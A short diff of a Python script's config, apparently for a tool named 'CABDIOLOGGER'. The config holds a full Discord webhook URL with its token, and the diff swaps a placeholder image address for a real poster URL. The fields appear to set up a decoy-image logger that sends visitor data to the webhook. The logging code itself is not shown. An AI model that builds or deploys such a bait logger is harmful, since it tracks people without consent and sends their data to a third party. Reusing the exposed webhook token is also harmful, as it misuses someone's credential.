@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1434011862139273287/rICD1g1pbX51grDfRHC1INmXRhtlJtSRwdBw3tQVEoNsEUC0AC42qK81NCon56iy4Nxl",
-    "image": "fotografin adresi", 
+    "image": "https://m.media-amazon.com/images/M/MV5BYzY2NDJlZjctOGI4MC00MTMzLWEwNzktYmJkYWUzODkyZjM3XkEyXkFqcGc@._V1_QL75_UY281_CR64,0,190,281_.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
